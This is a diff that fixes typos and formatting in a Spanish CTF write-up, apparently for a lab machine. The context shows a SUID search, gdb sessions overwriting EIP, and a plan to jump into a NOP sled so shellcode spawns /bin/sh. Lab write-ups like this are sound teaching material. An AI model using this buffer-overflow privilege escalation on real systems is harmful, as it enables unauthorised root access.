@@ -303,7 +303,7 @@ thrasivoulos@Sneaky:~$ find / -perm -u=s -type f 2>/dev/null
 /bin/ping6
 /bin/fusermount
 /bin/ping
-"												/usr/local/bin/chal										BOF Buffer Over Flow"
+" /usr/local/bin/chal		BOF Buffer Over Flow"
 /usr/sbin/uuidd
 /usr/sbin/pppd
 /usr/bin/at
@@ -378,7 +378,7 @@ Program received signal SIGSEGV, Segmentation fault.
 "0x41414141" in ?? ()
 (gdb) 
 ```
-Tenemos el EIP Sbrescrito con nuestras `AAA'S`
+Tenemos el EIP Sobrescrito con nuestras `AAA'S`
 Ahora cuantas `AAA..` tenemos que poner hasta llegar al EIP?
 Eso lo calculamos de la siguiente forma:
 
@@ -467,7 +467,7 @@ Invalid $PC address: 0x42424242
 
 Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
-0x42424242 in ?? ()
+"0x42424242" in ?? ()
 ```
 Perfecto como se aprecia Ya tenemos el `EBP` sobrescrito con `AAAA`, pero controlamos el `EIP` con nuestras `BBBB`
 
@@ -584,10 +584,10 @@ Starting program: /usr/local/bin/chal $(python exploit.py)
 Program received signal SIGSEGV, Segmentation fault.
 "0x41414141" in ?? ()
 ```
-Vemos que seguimos teniendo el contro del EIP, Perfecto!
+Vemos que `seguimos teniendo el contro del EIP`, Perfecto!
 
-Ahora vamos a listar la pila y ver donde esta nuestro SHELLCODE PARA pillar una direccion desde mas atras, en los NOPS 
-y que cuando se ejecute el EIP + la direccion antes de nuestro SHELLCODE se ejecute la /bin/sh
+Ahora vamos a listar la pila y ver donde esta nuestro SHELLCODE PARA pillar una direccion desde mas atras, en los `NOPS` 
+y que cuando se ejecute el `EIP` + la direccion antes de nuestro `SHELLCODE` se ejecute la `/bin/sh`
 ```bash
 (gdb) x/100x $esp-100
 0xbffff50c:     0x90909090      0x90909090      0x90909090      0x90909090
